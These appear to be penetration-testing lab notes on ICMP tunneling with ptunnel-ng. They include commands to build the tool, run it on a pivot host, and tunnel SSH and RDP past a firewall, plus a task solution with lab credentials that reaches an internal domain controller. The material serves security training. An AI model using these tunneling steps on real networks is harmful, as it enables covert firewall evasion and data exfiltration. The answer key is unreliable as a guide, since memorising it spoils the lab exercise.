### ICMP Tunneling with SOCKS

[ptunnel-ng](https://github.com/utoni/ptunnel-ng)

```
# ICMP tunneling encapsulates your traffic within ICMP packets containing echo requests and responses. 
# ICMP tunneling would only work when ping responses are permitted within a firewalled network. 
# When a host within a firewalled network is allowed to ping an external server, 
# it can encapsulate its traffic within the ping echo request and send it to an external server. 
# The external server can validate this traffic and send an appropriate response, 
# which is extremely useful for data exfiltration and creating pivot tunnels to an external server.

# We will use the ptunnel-ng tool to create a tunnel between our Ubuntu server and our attack host. 
# Once a tunnel is created, we will be able to proxy our traffic through the ptunnel-ng client. 
# We can start the ptunnel-ng server on the target pivot host. Let's start by setting up ptunnel-ng.
```

```
# Setting Up & Using ptunnel-ng

git clone https://github.com/utoni/ptunnel-ng.git                          # Cloning Ptunnel-ng
./autogen.sh                                                               # Building Ptunnel-ng with Autogen.sh
scp -r ptunnel-ng ubuntu@10.129.202.64:~/                                  # Transferring Ptunnel-ng to the Pivot Host

# Alternative approach of building a static binary

sudo apt install automake autoconf -y
cd ptunnel-ng/
sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
./autogen.sh
```

```
# Starting the ptunnel-ng Server on the Target Host:

ubuntu@WEB01:~/ptunnel-ng/src$ sudo ./ptunnel-ng -r10.129.202.64 -R22

# The IP address following -r should be the IP we want ptunnel-ng to accept connections on. 
# In this case, whatever IP is reachable from our attack host would be what we would use. 
# We would benefit from using this same thinking & consideration during an actual engagement.

# Back on the attack host, we can attempt to connect to the ptunnel-ng server (-p <ipAddressofTarget>) 
# but ensure this happens through local port 2222 (-l2222). 
# Connecting through local port 2222 allows us to send traffic through the ICMP tunnel.

# Connecting to ptunnel-ng Server from Attack Host:

sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22

# With the ptunnel-ng ICMP tunnel successfully established, 
# we can attempt to connect to the target using SSH through local port 2222 (-p2222).
```

```

### Network Traffic Analysis Considerations

```
# It is important that we confirm the tools we are using are performing as advertised 
# and that we have set up & are operating them properly. 

# In the case of tunneling traffic through different protocols taught in this section with ICMP tunneling, 
# we can benefit from analyzing the traffic we generate with a packet analyzer like Wireshark.

we can test traffic via Wireshark with e.g.:
ssh ubuntu@10.129.202.64
ssh -p2222 -lubuntu 127.0.0.1
```


### Task Solution 

```
# SSH to 10.129.25.78 (ACADEMY-PIVOTING-LINUXPIV) with user "ubuntu" and password "HTB_@cademy_stdnt!" 


git clone https://github.com/utoni/ptunnel-ng.git                          # Cloning Ptunnel-ng
./autogen.sh                                                               # Building Ptunnel-ng with Autogen.sh
scp -r ptunnel-ng ubuntu@10.129.25.78:~/                                   # copy to Pivot Host by scp

ssh ubuntu@10.129.25.78                                                    # login to pvot by ssh
cd ptunnel-ng/src/                  
sudo ./ptunnel-ng -r172.16.5.19 -R3389                                     # Starting ptunnel-ng server on pivot host
sudo ./ptunnel-ng -p10.129.25.78 -l3388 -r172.16.5.19 -R3389               # Starting ptunnel-ng client on PenTest host

xfreerdp /v:127.0.0.1:3388 /u:victor /p:pass@123                           # Login via RDP to DC through pivot hosts
